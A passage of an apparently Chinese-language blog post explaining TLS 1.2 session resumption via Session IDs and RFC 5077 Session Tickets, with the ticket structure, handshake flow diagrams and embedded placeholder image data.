WBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/3.jpeg" alt></p><p>&#x5BA2;&#x6237;&#x7AEF;&#x53EA;&#x9700;&#x5728;&#x5176; Client Hello &#x6D88;&#x606F;&#x4E2D;&#x53D1;&#x9001;&#x4E4B;&#x524D;&#x4ECE; Server &#x90A3;&#x91CC;&#x5F97;&#x77E5;&#x7684; Session ID &#xFF0C;&#x7136;&#x540E; Server &#x786E;&#x8BA4;&#x8FD9;&#x4E2A; Session ID &#x5728;&#x5B83;&#x7684; TLS &#x4F1A;&#x8BDD;&#x7F13;&#x5B58;&#x4E4B;&#x540E;&#xFF0C;&#x5B83;&#x4EEC;&#x5C31;&#x4F1A;&#x8FDB;&#x884C;&#x6240;&#x8C13;&#x7684; Abbreviated TLS Handshake &#x3002;&#x5728;&#x8FD9;&#x6B21; TLS &#x63E1;&#x624B;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E0D;&#x4F1A;&#x4EA4;&#x6362;&#x8BC1;&#x4E66;&#x6216;&#x5BC6;&#x94A5;&#x4FE1;&#x606F;&#xFF0C;&#x4E4B;&#x524D;&#x534F;&#x5546;&#x597D;&#x7684;&#x5BC6;&#x94A5;&#x4F1A;&#x88AB;&#x91CD;&#x65B0;&#x4F7F;&#x7528;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x4E00;&#x6B21; TLS Session Resumption &#x3002;</p><h4 id="TLS-1-2-Session-Resumption-Session-Ticket"><a href="#TLS-1-2-Session-Resumption-Session-Ticket" class="headerlink" title="TLS 1.2 Session Resumption - Session Ticket"></a>TLS 1.2 Session Resumption - Session Ticket</h4><p>&#x7136;&#x800C;&#xFF0C;Session ID &#x673A;&#x5236;&#x7684;&#x4E00;&#x4E2A;&#x5B9E;&#x9645;&#x9650;&#x5236;&#x662F;&#x8981;&#x6C42;&#x670D;&#x52A1;&#x5668;&#x4E3A;&#x6BCF;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x521B;&#x5EFA;&#x548C;&#x7EF4;&#x62A4;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD;&#x7F13;&#x5B58;&#x3002;&#x8FD9;&#x5C31;&#x5BFC;&#x81F4;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x51E0;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6BCF;&#x5929;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x6210;&#x5343;&#x4E0A;&#x4E07;&#x751A;&#x81F3;&#x4E0A;&#x767E;&#x4E07;&#x4E2A;&#x72EC;&#x7279;&#x7684;&#x8FDE;&#x63A5;&#xFF1B;&#x6BCF;&#x4E00;&#x4E2A;&#x6253;&#x5F00;&#x7684;TLS&#x8FDE;&#x63A5;&#x90FD;&#x4F1A;&#x6D88;&#x8017;&#x5185;&#x5B58;&#xFF0C;&#x9700;&#x8981; Session ID &#x7F13;&#x5B58;&#x548C;&#x5220;&#x9664;&#x7B56;&#x7565;&#xFF0C;&#x4EE5;&#x53CA;&#x5BF9;&#x4E8E;&#x6709;&#x8BB8;&#x591A;&#x670D;&#x52A1;&#x5668;&#x7684;&#x70ED;&#x95E8;&#x7F51;&#x7AD9;&#x7684;&#x90E8;&#x7F72;&#x6311;&#x6218;&#xFF0C;&#x7406;&#x60F3;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FD9;&#x4E9B;&#x7F51;&#x7AD9;&#x5E94;&#x8BE5;&#x4F7F;&#x7528;&#x5171;&#x4EAB;&#x7684; TLS Session &#x7F13;&#x5B58;&#x4EE5;&#x83B7;&#x5F97;&#x6700;&#x4F73;&#x6027;&#x80FD;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5BF9;&#x4E8E;&#x4EFB;&#x4F55;&#x591A;&#x670D;&#x52A1;&#x5668;&#x7684;&#x90E8;&#x7F72;&#xFF0C;Session ID &#x90FD;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x4ED4;&#x7EC6;&#x7684;&#x601D;&#x8003;&#x548C;&#x7CFB;&#x7EDF;&#x67B6;&#x6784;&#xFF0C;&#x4EE5;&#x786E;&#x4FDD;&#x4F1A;&#x8BDD;&#x7F13;&#x5B58;&#x7684;&#x826F;&#x597D;&#x8FD0;&#x884C;&#x3002;</p><p>&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x90E8;&#x7F72; TLS &#x4F1A;&#x8BDD;&#x7F13;&#x5B58;&#x7684;&#x8FD9;&#x4E00;&#x95EE;&#x9898;&#xFF0C;&#x5F15;&#x5165;&#x4E86; Session Ticket (RFC 5077)&#x66FF;&#x6362;&#x673A;&#x5236;&#xFF0C;&#x5B83;&#x53D6;&#x6D88;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x4FDD;&#x7559;&#x6BCF;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x4F1A;&#x8BDD;&#x72B6;&#x6001;&#x7684;&#x8981;&#x6C42;&#x3002;&#x53D6;&#x800C;&#x4EE3;&#x4E4B;&#x7684;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x8868;&#x793A;&#x652F;&#x6301;&#x4F1A;&#x8BDD;&#x7968;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD;&#x7968;&#x8BB0;&#x5F55;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x62EC;&#x6240;&#x6709;&#x7528;&#x53EA;&#x6709;&#x670D;&#x52A1;&#x5668;&#x77E5;&#x9053;&#x7684;&#x79D8;&#x5BC6;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x7684;&#x534F;&#x5546;&#x4F1A;&#x8BDD;&#x6570;&#x636E;&#x3002;&#x7136;&#x540E;&#xFF0C;&#x8BE5;&#x4F1A;&#x8BDD;&#x7968;&#x7531;&#x5BA2;&#x6237;&#x7AEF;&#x5B58;&#x50A8;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x5728;&#x540E;&#x7EED;&#x4F1A;&#x8BDD;&#x7684;&#x63E1;&#x624B;&#x6D88;&#x606F;&#x4E2D;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x4F1A;&#x8BDD;&#x6570;&#x636E;&#x53EA;&#x5B58;&#x50A8;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4F46;&#x7968;&#x636E;&#x4ECD;&#x7136;&#x662F;&#x5B89;&#x5168;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x662F;&#x7528;&#x53EA;&#x6709;&#x670D;&#x52A1;&#x5668;&#x77E5;&#x9053;&#x7684;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x7684;&#x3002;</p><p>&#x4F1A;&#x8BDD;&#x7968;&#x673A;&#x5236;&#x88AB;&#x79F0;&#x4E3A;&#x65E0;&#x72B6;&#x6001;&#x6062;&#x590D;&#x673A;&#x5236;&#x3002;&#x65E0;&#x72B6;&#x6001;&#x6062;&#x590D;&#x673A;&#x5236;&#x7684;&#x4E3B;&#x8981;&#x6539;&#x8FDB;&#x662F;&#x53D6;&#x6D88;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x7684;&#x4F1A;&#x8BDD;&#x7F13;&#x5B58;&#xFF0C;&#x7B80;&#x5316;&#x4E86;&#x90E8;&#x7F72;&#xFF0C;&#x8981;&#x6C42;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x6BCF;&#x6B21;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x65B0;&#x8FDE;&#x63A5;&#x65F6;&#x63D0;&#x4F9B;&#x4F1A;&#x8BDD;&#x7968;&#x636E;&#xFF0C;&#x76F4;&#x5230;&#x7968;&#x636E;&#x8FC7;&#x671F;&#x3002;</p><p>TLS SessionTicket &#x662F;&#x4E00;&#x4E2A;&#x6269;&#x5C55;&#xFF0C;&#x5176;&#x57FA;&#x4E8E; <a href="https://tools.ietf.org/html/rfc4366" target="_blank" rel="noopener">RFC4366</a> &#x3002;Ticket &#x7684;&#x683C;&#x5F0F;&#x662F;&#x4E00;&#x4E2A; opaque &#x7684;&#x7ED3;&#x6784;&#xFF0C;&#x7528;&#x4E8E;&#x643A;&#x5E26;&#x7279;&#x5B9A;&#x4F1A;&#x8BDD;&#x7684;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#x3002;RFC &#x63A8;&#x8350;&#x7684; Session Ticket &#x7ED3;&#x6784;&#x5982;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct {</span><br><span class="line">  <span class="hljs-built_in">uint</span>32 ticket_lifetime_hint;</span><br><span class="line">  opaque ticket&lt;<span class="hljs-number">0.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">} NewSessionTicket;</span><br><span class="line"></span><br><span class="line">struct {</span><br><span class="line">  opaque key_name[<span class="hljs-number">16</span>];</span><br><span class="line">  opaque iv[<span class="hljs-number">16</span>];</span><br><span class="line">  opaque encrypted_state&lt;<span class="hljs-number">0.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">  opaque mac[<span class="hljs-number">32</span>];</span><br><span class="line">} ticket;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x6269;&#x5C55;&#x53EF;&#x4EE5;&#x5728; ClientHello &#x548C; ServerHello &#x4E2D;&#x53D1;&#x9001;&#x3002;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x62E5;&#x6709;&#x4E00;&#x4E2A;&#x60F3;&#x8981;&#x7528;&#x6765;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#x7684; ticket&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x5C31;&#x4F1A;&#x5728; ClientHello &#x4E2D;&#x7684; SessionTicket &#x6269;&#x5C55;&#x4E2D;&#x5305;&#x542B;&#x8FD9;&#x4E2A; ticket&#x3002;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x6CA1;&#x6709;&#x7968;&#x636E;&#xFF0C;&#x5E76;&#x4E14;&#x51C6;&#x5907;&#x5728; NewSessionTicket &#x63E1;&#x624B;&#x6D88;&#x606F;&#x4E2D;&#x63A5;&#x6536;&#x7968;&#x636E;&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x5FC5;&#x987B;&#x5728; SessionTicket &#x6269;&#x5C55;&#x4E2D;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x957F;&#x5EA6;&#x4E3A;&#x96F6;&#x7684; Session Ticket &#x3002;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x51C6;&#x5907;&#x5728; NewSessionTicket &#x63E1;&#x624B;&#x6D88;&#x606F;&#x4E2D;&#x63A5;&#x6536;&#x7968;&#x636E;&#xFF0C;&#x5219;&#x5FC5;&#x987B;&#x4E0D;&#x5305;&#x542B; SessionTicket &#x6269;&#x5C55;&#xFF0C;&#x9664;&#x975E;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x901A;&#x8FC7;&#x5176;&#x4ED6;&#x65B9;&#x5F0F;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x6536;&#x5230;&#x7684;&#x975E;&#x7A7A;&#x7968;&#x636E;&#x3002;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">     <span class="hljs-built_in"> Client </span>                                              Server</span><br><span class="line"></span><br><span class="line">      ClientHello</span><br><span class="line">     (empty SessionTicket extension)--------&gt;</span><br><span class="line">                                                      ServerHello</span><br><span class="line">                                  (empty SessionTicket extension)</span><br><span class="line">                                                     Certificate*</span><br><span class="line">                                               ServerKeyExchange*</span><br><span class="line">                                              CertificateRequest*</span><br><span class="line">                                   &lt;--------      ServerHelloDone</span><br><span class="line">      Certificate*</span><br><span class="line">      ClientKeyExchange</span><br><span class="line">      CertificateVerify*</span><br><span class="line">      [ChangeCipherSpec]</span><br><span class="line">      Finished                     --------&gt;</span><br><span class="line">                                                 NewSessionTicket</span><br><span class="line">                                               [ChangeCipherSpec]</span><br><span class="line">                                   &lt;--------             Finished</span><br><span class="line">      Application Data             &lt;-------&gt;     Application Data</span><br><span class="line"></span><br><span class="line">Figure 1: Message Flow <span class="hljs-keyword">for</span> Full Handshake Issuing New Session Ticket</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x4E0A;&#x6D41;&#x7A0B;&#x56FE;&#x6240;&#x793A;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x901A;&#x8FC7;&#x5728; ClientHello &#x6D88;&#x606F;&#x4E2D;&#x5305;&#x542B;&#x4E00;&#x4E2A; SessionTicket TLS &#x6269;&#x5C55;&#x540D;&#x6765;&#x8868;&#x793A;&#x5B83;&#x652F;&#x6301;&#x8FD9;&#x79CD;&#x673A;&#x5236;&#xFF0C;&#x6B64;&#x65F6; SessionTicket &#x4E3A;&#x7A7A;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5C06;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x7A7A;&#x7684;SessionTicket &#x6269;&#x5C55;&#x6765;&#x8868;&#x793A;&#x5B83;&#x5C06;&#x4F7F;&#x7528; NewSessionTicket &#x63E1;&#x624B;&#x6D88;&#x606F;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x65B0;&#x7684; Session Ticket&#xFF0C;&#x8BE5;&#x6D88;&#x606F;&#x662F;&#x5728;&#x670D;&#x52A1;&#x5668;&#x6210;&#x529F;&#x9A8C;&#x8BC1;&#x5BA2;&#x6237;&#x7AEF;&#x7684; Finished &#x6D88;&#x606F;&#x540E;&#xFF0C;&#x5728;ChangeCipherSpec &#x6D88;&#x606F;&#x4E4B;&#x524D;&#x7684; TLS &#x63E1;&#x624B;&#x671F;&#x95F4;&#x53D1;&#x9001;&#x3002;&#x5728;&#x5F97;&#x5230; Session Ticket &#x540E;&#xFF0C;Client &#x5C06;&#x8BE5; Session Ticket &#x4E0E;&#x4E3B;&#x5BC6;&#x548C;&#x5176;&#x4ED6;&#x4E0E;&#x5F53;&#x524D;&#x4F1A;&#x8BDD;&#x76F8;&#x5173;&#x7684;&#x53C2;&#x6570;&#x4E00;&#x8D77;&#x7F13;&#x5B58;&#x3002;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="hljs-built_in"> Client </span>                                               Server</span><br><span class="line">     ClientHello</span><br><span class="line">     (SessionTicket extension)      --------&gt;</span><br><span class="line">                                                      ServerHello</span><br><span class="line">                                  (empty SessionTicket extension)</span><br><span class="line">                                                 NewSessionTicket</span><br><span class="line">                                               [ChangeCipherSpec]</span><br><span class="line">                                   &lt;--------             Finished</span><br><span class="line">     [ChangeCipherSpec]</span><br><span class="line">     Finished                      --------&gt;</span><br><span class="line">     Application Data              &lt;-------&gt;     Application Data</span><br><span class="line"></span><br><span class="line">Figure 2: Message Flow <span class="hljs-keyword">for</span> Abbreviated Handshake Using New Session</span><br><span class="line">                              Ticket</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x5E0C;&#x671B;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#x65F6;&#xFF0C;&#x5B83;&#x5728; ClientHello &#x6D88;&#x606F;&#x4E2D;&#x7684; SessionTicket &#x6269;&#x5C55;&#x4E2D;&#x5305;&#x542B;&#x8BE5;&#x7968;&#x636E;&#x3002;&#x7136;&#x540E;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x6536;&#x5230;&#x7684;&#x7968;&#x636E;&#x8FDB;&#x884C;&#x89E3;&#x5BC6;&#xFF0C;&#x9A8C;&#x8BC1;&#x7968;&#x636E;&#x7684;&#x6709;&#x6548;&#x6027;&#xFF0C;&#x4ECE;&#x7968;&#x636E;&#x7684;&#x5185;&#x5BB9;&#x4E2D;&#x68C0;&#x7D22;&#x4F1A;&#x8BDD;&#x72B6;&#x6001;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x72B6;&#x6001;&#x6765;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#x3002;&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x6210;&#x529F;&#x9A8C;&#x8BC1;&#x4E86;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x7968;&#x636E;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x5728; ServerHello &#x4E4B;&#x540E;&#x52A0;&#x5165; NewSessionTicket &#x63E1;&#x624B;&#x6D88;&#x606F;&#x6765;&#x7EED;&#x8BA2;&#x7968;&#x636E;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5B9E;&#x4F8B;&#x6765;&#x8FDB;&#x4E00;&#x6B65;&#x4E86;&#x89E3;&#x8FD9;&#x4E2A;&#x673A;&#x5236;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/4.jpeg" alt></p><p>&#x5BA2;&#x6237;&#x7AEF;&#x9996;&#x5148;&#x901A;&#x8FC7;&#x5728; Client Hello &#x6D88;&#x606F;&#x4E2D;&#x6DFB;&#x52A0; SessionTickets TLS Extension &#x6765;&#x8868;&#x660E;&#x5B83;&#x652F;&#x6301;&#x65E0;&#x72B6;&#x6001;&#x4F1A;&#x8BDD;&#x6062;&#x590D;&#xFF08;&#x7EFF;&#x8272;&#x90E8;&#x5206;&#xFF09;&#xFF0C; Server &#x8FD8;&#x4F1A;&#x901A;&#x8FC7;&#x53D1;&#x9001;&#x5305;&#x542B;&#x6709;&#x7A7A;&#x7684; SessionTicket TLS Extension &#x7684; Server Hello &#x6D88;&#x606F;&#x7ED9; Client &#xFF0C;&#x8868;&#x793A; Server &#x652F;&#x6301; SessionTicket TLS Extension&#xFF08;&#x7EA2;&#x8272;&#x90E8;&#x5206;&#xFF09;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr